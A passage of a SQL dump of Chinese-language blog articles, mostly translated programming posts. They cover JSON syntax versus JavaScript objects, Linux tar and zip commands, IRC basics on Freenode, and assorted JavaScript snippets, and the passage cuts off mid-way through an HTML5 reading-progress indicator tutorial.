(344, 'JSON不仅仅是一个javascript对象', '<p><embed id="xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd" type="application/thunder_download_plugin" height="0" width="0"/>很多人认为json就是一个javascript对象，但是实际上不是这样的，json仅仅是受到javascript对象结构的启发而创建的一种字符串表示。json被设计用来简化和消除在服务器和浏览器之间进行数据传输的复杂性。但是，因为其结构简单，因此，也被用在了其它应用程序之间进行数据传输，而不仅仅用在浏览器和服务器之间。</p><p>我曾尝试复制一些javascript对象并在一个基于json进行传输书签的web服务器上进行传输，但是这并不能正常工作，这是为什么呢？让我们看看我发送的javascript对象结构：<br/></p><pre class="brush:js;toolbar:false">{\r\n&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;:&nbsp;&quot;why&nbsp;this&nbsp;kolaveri&nbsp;di&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;&nbsp;:&nbsp;&quot;http://www.youtube.com/watch?v=YR12Z8f1Dh8&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;singer:&nbsp;&quot;Dhanush&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;movie:&nbsp;&quot;3&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;music&nbsp;:&nbsp;&quot;Anirudh&nbsp;Ravichandran&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;views&nbsp;:&nbsp;10000000,\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Adding&nbsp;this&nbsp;for&nbsp;testing&nbsp;purpose\r\n&nbsp;&nbsp;&nbsp;&nbsp;play&nbsp;:&nbsp;function()&nbsp;{&nbsp;},\r\n}</pre><p>当我发送它时，我从服务器得到了一个“Unexpected token n”的错误（顺便提一下，我用的是NodeJs&nbsp;和Express框架），这意味着，这段代码不是一个合法的Json对象。我想知道这为什么会有错误，于是我阅读了Douglas Crockford写的Json规范并且理解了下面内容：</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>所有的key都应该在双引号之间。</p></li><li><p>Json不支持注释。</p></li><li><p>Json的值不能是函数或者undefined，它的值可以使在双引号之间的字符串，数字或者是true，false，或者是null，或者是对象和数组，这些结构也可以嵌套。</p></li><li><p>Json的最后一个值应该没有后面的逗号的（,）。</p></li></ol><p>然后，修改上面的代码为如下内容：<br/></p><pre class="brush:js;toolbar:false">{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;name&quot;&nbsp;:&nbsp;&quot;why&nbsp;this&nbsp;kolaveri&nbsp;di&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;url&quot;&nbsp;&nbsp;:&nbsp;&quot;http://www.youtube.com/watch?v=YR12Z8f1Dh8&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;singer&quot;:&nbsp;&quot;Dhanush&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;movie&quot;:&nbsp;&quot;3&quot;,\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;views&quot;&nbsp;:&nbsp;10000000,\r\n&nbsp;&nbsp;&nbsp;&nbsp;&quot;music&quot;&nbsp;:&nbsp;&quot;Anirudh&nbsp;Ravichandran&quot;\r\n}</pre><p><br/></p><p>我认为，在我们的web项目中有很多基于json的配置文件（package.json，bower.json），理解和学习json是非常重要的。因此，理解关于json格式对于每一个web开发者都是必须的。</p><p><br/></p><p>祝你编码快乐！</p><p>［原文：http://www.fizerkhan.com/blog/posts/JSON-is-not-Javascript-Object.html］</p>', '很多人认为json就是一个javascript对象，但是实际上不是这样的，json仅仅是受到javascript对象结构的启发而创建的一种字符串表示。json被设计用来简化和消除在服务器和浏览器之间进行数据传输的复杂性。但是，因为其结构简单，因此，也被用在了其它应用程序之间进行数据传输，而不仅仅用在浏览器和服务器之间', 'http://agiledev-arsenals.stor.sinaapp.com/cover/7e1be4efb49b840391d3757f86b28bb6.jpg', 'mylxsw', '翻译', 1, 0, 1399385019, 1399385661, 0, 'html'),
(345, 'Linux下文件压缩解压', '<pre class="brush:bash;toolbar:false">tar&nbsp;-zcvf&nbsp;/home/xahot.tar.gz&nbsp;/xahot</pre><p style=";font-family:SimSun;font-size:14px">tar -zcvf 打包后生成的文件名全路径 要打包的目录</p><p style=";font-family:SimSun;font-size:14px">例子：把/xahot文件夹打包后生成一个/home/xahot.tar.gz的文件。</p><p style=";font-family:SimSun;font-size:14px">zip 压缩方法：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">压缩当前的文件夹</p><pre class="brush:bash;toolbar:false">zip&nbsp;-r&nbsp;./xahot.zip&nbsp;./*</pre><p style=";font-family:SimSun;font-size:14px">-r表示递归<br/></p><p style=";font-family:SimSun;font-size:14px">zip [参数] [打包后的文件名] [打包的目录路径]</p><p style=";font-family:SimSun;font-size:14px">解压 unzip xahot.zip 不解释</p><p style=";font-family:SimSun;font-size:14px">linux zip命令的基本用法是：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">linux zip命令参数列表：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-a 将文件转成ASCII模式</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-F 尝试修复损坏的压缩文件</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-h 显示帮助界面</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-m 将文件压缩之后，删除源文件</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-n 特定字符串 不压缩具有特定字尾字符串的文件</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-o 将压缩文件内的所有文件的最新变动时间设为压缩时候的时间</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-q 安静模式，在压缩的时候不显示指令的执行过程</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-r 将指定的目录下的所有子目录以及文件一起处理</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-S 包含系统文件和隐含文件（S是大写）</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-t 日期 把压缩文件的最后修改日期设为指定的日期，日期格式为mmddyyyy</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">举例：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">将/home/wwwroot/xahot/ 这个目录下所有文件和文件夹打包为当前目录下的xahot.zip</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><pre class="brush:bash;toolbar:false">zip&nbsp;–q&nbsp;–r&nbsp;xahot.zip&nbsp;/home/wwwroot/xahot</pre><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">上面的命令操作是将绝对地址的文件及文件夹进行压缩.以下给出压缩相对路径目录</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">比如目前在Bliux这个目录下,执行以下操作可以达到以上同样的效果.</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><pre class="brush:bash;toolbar:false">zip&nbsp;–q&nbsp;–r&nbsp;xahot.zip&nbsp;xahot</pre><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">比如现在我的xahot目录下,我操作的zip压缩命令是</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><pre class="brush:bash;toolbar:false">zip&nbsp;–q&nbsp;–r&nbsp;xahot.zip&nbsp;*</pre><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">以上是在安静模式下进行的，而且包含系统文件和隐含文件</p><p style=";font-family:SimSun;font-size:14px">//////////////////////////////////////////////////////////</p><p style=";font-family:SimSun;font-size:14px">unzip语 法：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">unzip [-cflptuvz][-agCjLMnoqsVX][-P &lt;密码&gt;][.zip文件][文件][-d &lt;目 录&gt;][-x &lt;文件&gt;] 或 unzip [-Z]</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">补充说明：unzip为.zip压缩文件的解压缩程序。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">unzip参 数：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-c 将解压缩的结果显示到屏幕上，并对字符做适当的转换。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-f 更新现有的文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-l 显示压缩文件内所包含的文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-p 与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-t 检查压缩文件是否正确。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-u 与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-v 执行是时显示详细的信息。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-z 仅显示压缩文件的备注文字。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-a 对文本文件进行必要的字符转换。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-b 不要对文本文件进行字符转换。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-C 压缩文件中的文件名称区分大小写。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-j 不处理压缩文件中原有的目录路径。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-L 将压缩文件中的全部文件名改为小写。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-M 将输出结果送到more程序处理。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-n 解压缩时不要覆盖原有的文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-o 不必先询问用户，unzip执行后覆盖原有文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-P&lt;密码&gt; 使用zip的密码选项。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-q 执行时不显示任何信息。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-s 将文件名中的空白字符转换为底线字符。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-V 保留VMS的文件版本信息。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-X 解压缩时同时回存文件原来的UID/GID。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;[.zip文件] 指定.zip压缩文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;[文件] 指定要处理.zip压缩文件中的哪些文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-d&lt;目录&gt; 指定文件解压缩后所要存储的目录。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-x&lt;文件&gt; 指定不要处理.zip压缩文件中的哪些文件。</p><p style=";font-family:SimSun;font-size:14px">&nbsp;&nbsp;&nbsp;&nbsp;-Z unzip -Z等于执行zipinfo指令</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">举例：</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">将/home/wwwroot/xahot.zip解压到当前目录</p><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><pre class="brush:bash;toolbar:false">unzip&nbsp;xahot.zip</pre><p style=";font-family:SimSun;font-size:14px">&nbsp;</p><p style=";font-family:SimSun;font-size:14px">如果出现这个提示：</p><p style=";font-family:SimSun;font-size:14px">-bash: zip: command not found&nbsp;&nbsp;&nbsp;&nbsp;不能执行ZIP压缩，是因为没有安装ZIP，</p><p style=";font-family:SimSun;font-size:14px">运行下这条安装命令即可&nbsp;&nbsp;yum install zip</p><p><br/></p><p>原文：http://blog.sina.com.cn/s/blog_7479f7990100zwkp.html</p>', '本文记录了如何在Linux下进行文件压缩以及解压的方式。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/547f7b42dab866620b44f46ce20c2252.jpg', 'mylxsw', '转载', 1, 0, 1399430032, 1399822704, 0, 'html'),
(346, '每个程序员都应该使用IRC', '<p>我是一个水平很一般的程序员，但是我喜欢从他人那里学习新鲜的东西。我们有很多媒介用于去学习一些新鲜、有趣而且有用的东西。作为一个程序员，我使用“谷歌搜索”，&quot;Stack Overflow&quot;和“Github”学习新的知识和寻找我遇到的问题的答案。但是，大多数时候，当我看到那些回答的时候，总会有很多新的问题和解决方案从我的脑海中浮现出来。尽管我也可以在Stack Overflow和Github issues上回复或者是添加我对问题的评论，但这并不太人性化。我的意思是，在我们有很多其他的事情需要做的时候，这不是一个能够很好的进行短时间内快速交流的办法，有可能我们的问题需要在两个小时或者是两天之后才会有人回答。</p><p><br/></p><h3>什么是IRC？</h3><p>IRC是一个用于交流的非常好的媒介，可以在上面说明你的疑惑或者问题，或者学习一些新的东西。总之，它是一个你可以遇到很多有魅力的天才的人的地方。<br/></p><p><br/></p><p>下面这段文字描述来自维基百科：</p><pre class="brush:bash;toolbar:false">IRC(互联网中继聊天）是一种通过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</pre><p>IRC包含频道，频道是一个类似于聊天室的东西，但是它更加专注于一些技术和语言如#html，#css，#javascript，#go-lang等。你可以到任何频道咨询问题或者是从他人的讨论中学习知识。<br/></p><p>我使用Freenode（广泛使用的一款开放的IRC服务器）。让我们看看如何使用Freenode作为IRC服务器的吧。</p><p><br/></p><h3>注册你的昵称</h3><p>在IRC中，需要通过昵称定位到你，所以，最好注册一个昵称。要想访问IRC需要昵称，但这并不是必须的。</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>访问<a href="http://webchat.freenode.net/" style="color: rgb(57, 56, 56); -webkit-transition: color 0.2s; transition: color 0.2s; font-family: &#39;Lucida Grande&#39;, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; line-height: 26.399999618530273px; white-space: normal;">http://webchat.freenode.net/</a></p></li><li><p>输入你的昵称</p></li><li><p>输入验证码并连接</p></li></ol><p>注册一个昵称，</p><pre class="brush:bash;toolbar:false">/msg&nbsp;NickServ&nbsp;REGISTER&nbsp;password&nbsp;youremail@example.com</pre><p>一旦你已经注册了，会发送一封邮件到你的邮箱中，你只需要复制并粘贴验证命令到IRC中就可以了。现在，你已经拥有了自己的昵称，其他人是不能和你重名的。即使别人尝试去用这个昵称，也必须加以_的前缀。<br/></p><p><br/></p><h3>使用你的昵称登录</h3><p>无论什么时候你想要进入IRC，你都要输入你的昵称和密码，<br/></p><pre class="brush:bash;toolbar:false">/msg&nbsp;nickserv&nbsp;identify&nbsp;yourpassword</pre><p><br/></p><h3>加入频道<br/></h3><p>如果你想要加入某个频道，输入&quot;/join #channelname&quot;即可。如果你想加入C语言的频道的话，输入&quot;/join #c&quot;。<br/></p><p><br/></p><p>为了避免你不知道频道名字，我们可以在这里进行<a href="http://irc.netsplit.de/channels/" target="_blank" textvalue="搜索">搜索</a>。</p><p>一旦你加入了一个频道，你就可以询问问题或者是听他人的问题了。<br/></p><p><br/></p><p>其它有用的命令</p><pre class="brush:bash;toolbar:false">/msg&nbsp;&lt;name&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;发送一条私信给他人.\r\n/whois&nbsp;&lt;name&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;获取这个人是谁的一个简短描述.\r\n/nick&nbsp;&nbsp;&lt;name&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;修改你的昵称\r\n/me&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;给频道发送一个动作.\r\n/away&nbsp;&lt;message&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;设置一个away消息.\r\n/quit&nbsp;&lt;last&nbsp;words&gt;&nbsp;&nbsp;-&nbsp;退出，并且会退出时发送你的最后一条消息.\r\n/clear&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;清理频道的内容.\r\n/clear&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;清理所有频道的内容.</pre><p>当你使用IRC时，你必须遵守一些<a href="https://workaround.org/getting-help-on-irc" style="color: rgb(57, 56, 56); -webkit-transition: color 0.2s; transition: color 0.2s; font-family: &#39;Lucida Grande&#39;, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; line-height: 26.399999618530273px; white-space: normal;">Christoph Haas</a>规定的一些规定。</p><p>IRC教会了我很多，我希望你在使用之后也会有同样的感受。<br/></p><p><br/></p><p>[原文： http://www.fizerkhan.com/blog/posts/Every-Programmer-should-use-IRC.html]</p>', 'IRC(互联网中继聊天）是一种通过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/a4b68b9b1031216c66a9055191c42eef.jpg', 'mylxsw', '翻译', 1, 0, 1399435095, 1399435240, 0, 'html');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(347, '能够节省你的时间的几个javascript片段', '<p>当我在开发web应用的时候，我从不同的地方获取了一些javascript片段（大部分来源于stackoverflow），我希望这将会节省你的时间。<br/></p><h3>获取查询字符串的值</h3><p>这个函数可以帮助你从url中获取查询字符串的值。<br/></p><pre class="brush:js;toolbar:false">function&nbsp;getParameterByName(name)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;name.replace(/[\\[]/,&nbsp;&quot;\\\\\\[&quot;).replace(/[\\]]/,&nbsp;&quot;\\\\\\]&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;regex&nbsp;=&nbsp;new&nbsp;RegExp(&quot;[\\\\?&amp;]&quot;&nbsp;+&nbsp;name&nbsp;+&nbsp;&quot;=([^&amp;#]*)&quot;),\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results&nbsp;=&nbsp;regex.exec(location.search);\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;results&nbsp;==&nbsp;null&nbsp;?&nbsp;&quot;&quot;&nbsp;:&nbsp;decodeURIComponent(results[1].replace(/\\+/g,&nbsp;&quot;&nbsp;&quot;));\r\n}</pre><h3>给日期添加前缀的“0”</h3><p>有时候你可能需要在日期上添加前缀的0.<br/></p><p>(&quot;0&quot; + anynumber).slice(-2))将会在数字上添加前缀的“0”</p><pre class="brush:js;toolbar:false">var&nbsp;date&nbsp;=&nbsp;&nbsp;new&nbsp;Date();\r\nvar&nbsp;dateString&nbsp;=&nbsp;(&#39;0&#39;&nbsp;+&nbsp;date.getDate()).slice(-2)&nbsp;+&nbsp;&#39;/&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;(&#39;0&#39;&nbsp;+&nbsp;(date.getMonth()+1)).slice(-2)&nbsp;+&nbsp;&#39;/&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+&nbsp;date.getFullYear();</pre><h3>使用jquery让checkbox选中<br/></h3><p>我在这个问题上困惑了很久，在最新版本的jquery中，我尝试使用$(&quot;#checkbox&quot;).attr(&quot;checked&quot;);，但是这并不能正常工作。<br/></p><p>从jquery &gt; 1.6以来，应该时这样的：</p><pre class="brush:js;toolbar:false">//&nbsp;new&nbsp;property&nbsp;method\r\n$(&#39;#checkBox&#39;).prop(&#39;checked&#39;);</pre><h3>窗口滚动时触发类的最好方法<br/></h3><p>我们经常会在窗口滚动的时候触发一些元素的显示隐藏，比如我们可能会在窗口下拉的时候出现一个返回顶部的按钮。<br/></p><pre class="brush:js;toolbar:false">//&nbsp;Toggle&nbsp;header&nbsp;position\r\nvar&nbsp;breakpoint&nbsp;=&nbsp;100;&nbsp;\r\n//&nbsp;Can&nbsp;be&nbsp;any&nbsp;value&nbsp;based&nbsp;on&nbsp;your&nbsp;layout\r\nvar&nbsp;headerDomElement&nbsp;=&nbsp;$(&quot;header&quot;)[0];\r\nvar&nbsp;$window&nbsp;=&nbsp;$(window)\r\n$window&nbsp;.on(&quot;scroll&quot;,&nbsp;function&nbsp;()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;top&nbsp;=&nbsp;$window.scrollTop();\r\n&nbsp;&nbsp;&nbsp;&nbsp;headerDomElement.classList.toggle(&quot;header-fixed&quot;,&nbsp;&nbsp;top&nbsp;&gt;&nbsp;0);\r\n});</pre><pre class="brush:js;toolbar:false">//&nbsp;Goto&nbsp;top&nbsp;button&nbsp;show&nbsp;and&nbsp;hide\r\nvar&nbsp;breakpoint&nbsp;=&nbsp;0;\r\nvar&nbsp;btnGoTopDomElement&nbsp;=&nbsp;$(&quot;btn-gotop&quot;)[0];\r\nvar&nbsp;$window&nbsp;=&nbsp;$(window)\r\n$window.on(&quot;scroll&quot;,&nbsp;function&nbsp;()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;top&nbsp;=&nbsp;$window&nbsp;.scrollTop();\r\n&nbsp;&nbsp;&nbsp;&nbsp;btnGoTopDomElement.classList.toggle(&quot;show&quot;,&nbsp;&nbsp;top&nbsp;&gt;&nbsp;0);\r\n});</pre><p>取代jquery的toggleClass方法，你可以在dom元素上使用classList.toggle，这将会提升性能。感谢<span style="color: rgb(57, 56, 56); font-family: &#39;Lucida Grande&#39;, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; line-height: 26px;">Paul Irish。</span></p><h3><span style="color: rgb(57, 56, 56); font-family: &#39;Lucida Grande&#39;, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; line-height: 26px;">交互式表单提交<br/></span></h3><p><span style="color: rgb(57, 56, 56); font-family: &#39;Lucida Grande&#39;, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; line-height: 26px;">如果服务器或者网络缓慢的话，表单提交可能会花费一些时间。同时，如果提交按钮仍然式可点击的，这将会是非常用户不友好的。<br/></span></p><p><span style="color:#393838;font-family:Lucida Grande, Helvetica Neue, Helvetica, sans-serif"><span style="line-height: 26px;">你可以在表单的onsubmit属性上禁止提交按钮或者是做一些字段的验证。</span></span></p><pre class="brush:js;toolbar:false">&lt;form&nbsp;accept-charset=&quot;UTF-8&quot;&nbsp;method=&quot;POST&quot;&nbsp;action=&quot;/message&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;onsubmit=&quot;return&nbsp;validateForm(this);&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;Submit&quot;&gt;\r\n&lt;/form&gt;</pre><pre class="brush:js;toolbar:false">function&nbsp;validateForm(formObj)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;formObj.submit.disabled&nbsp;=&nbsp;true;\r\n&nbsp;&nbsp;&nbsp;&nbsp;formObj.submit.value&nbsp;=&nbsp;&quot;Submitting...&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;\r\n}</pre><p>如果你有一些js片段的话，不妨分享一下。<br/></p><p>［来源： http://www.fizerkhan.com/blog/posts/Javascript-snippets-save-your-time.html］</p>', '当我在开发web应用的时候，我从不同的地方获取了一些javascript片段（大部分来源于stackoverflow），我希望这将会节省你的时间。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/7e1be4efb49b840391d3757f86b28bb6.jpg', 'mylxsw', '翻译', 1, 0, 1399531893, 1399531961, 0, 'html'),
(348, 'html5实现文章阅读进度指示器', '<p>近期我发现很多网站增加了一种能够显示出当前阅读位置的指示器（你阅读了多少依赖于你在这篇文章上向下拉动滚动条拉动了多少）。通常，这种指示器被用在博客的文章或者是长表单上，用于帮助阅读着了解他们还有多少就能完成这篇文章或者表单。</p><h3>问题<br/></h3><p>要建立一个阅读位置指示器，我们需要回答如下两个问题：<br/></p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p><strong>网页的长度是多少？</strong>网页的长度与文档当前的长度相同，这可以通过javascript计算出来。</p></li><li><p><strong>用户当前的阅读位置在哪？</strong>要获取用户当前的阅读位置可能需要进入用户的思维中去寻找了，在我们所能处理的给定的技术范围之内，这看起来像是人工智能和不可能实现的。</p></li></ol><p>这让我们不得不去使用一种完全不同的方式去解决这个问题。<br/></p><h3>原则<br/></h3><p>这项技术的原则是基于用户不得不滚动滚到条到页面的底部的简单的一个事实。一旦用户滚动滚到条到了页面的底部，我们可以得到用户已经阅读完成了这篇文章。解决获取当前用户阅读位置这个问题的关键看起来就是解决滚动条滚动事件了。<br/></p><p>假设用户从页面顶部开始阅读，而且在到达页面底部之前他只会一次性的滚动滚动条，我们将会回答下列问题：</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p><strong>用户需要滚动多久才能滚到到页面的底部？</strong>隐藏在用户视点之下的页面部分实际上就反映了用户需要滚动到页面底部的实际数量。这将成为max属性。<br/></p></li><li><p><strong>用户已经滚动了多少部分？</strong>这个可以通过文档内容在窗口中的位置到顶部的垂直偏移来进行计算，这个将成为我们的value属性。</p></li></ol><p><img src="http://cdn.css-tricks.com/wp-content/uploads/2014/05/principle_bvzhjb.gif" width="807" height="857"/></p><p>上图中的例子模拟了用户滚动窗口的行为，当用户向下滚动滚动条的时候，垂直偏移增加。<br/></p><p><br/></p><p>在浏览器的上下文中，document和window是两个不同的对象。window是一个浏览器中可见的区域（在上面例子中蓝色窗口中的部分），document实际上是window中载入的页面（例子中当前滚动的灰色框）。<br/></p><h3>标记</h3><p>让我们从最基本的标记开始：<br/></p><pre class="brush:html;toolbar:false">&lt;progress&nbsp;value=&quot;0&quot;&gt;&lt;/progress&gt;</pre><p>显式的指定value属性是非常重要的。否则，我们的进度条将会处于一个不可知的状态。我们不想给进度条的不可知状态添加不必要的css样式。因此，我们选择通过添加一个初始值以忽略该状态。刚开始，用户从页面的顶部开始阅读，因此，开始值被设置为0，默认情况下，最大的值是1（如果没有指定的话）。<br/></p><p>要得到max属性正确的值，我们需要从document高度中减去window的高度。这只能通过javascript来进行处理，我们将在后面的部分再讨论它。</p><p>标记在文档中的位置是重度依赖于html文档中剩余元素是怎么放置的。通常，如果你的文档中没有固定位置（fixed）的容器的话，你可以把进度条元素放在body元素内部其它所有元素的顶部。</p><pre class="brush:html;toolbar:false">&lt;body&gt;\r\n&nbsp;&nbsp;&lt;progress&nbsp;value=&quot;0&quot;&gt;&lt;/progress&gt;\r\n\r\n&nbsp;&nbsp;&lt;!--------------------------------\r\n&nbsp;&nbsp;这里放额外的标记\r\n&nbsp;&nbsp;---------------------------------&gt;\r\n&lt;/body&gt;</pre><h3>为指示器添加样式<br/></h3><p>我们想要让我们的指示器总是在页面的顶部显示，即使用户滚动窗口也是这样，我们将progress元素设置为fixed。另外，我们应该希望进度条的背景是transparent（透明）的，这样在页面滚动时就不会创建一个空的进度条阻碍用户视线。同时，这也会帮助我们处理好在javascript被禁用的时候浏览器的表现，后面我们会介绍这一点。<br/></p><pre 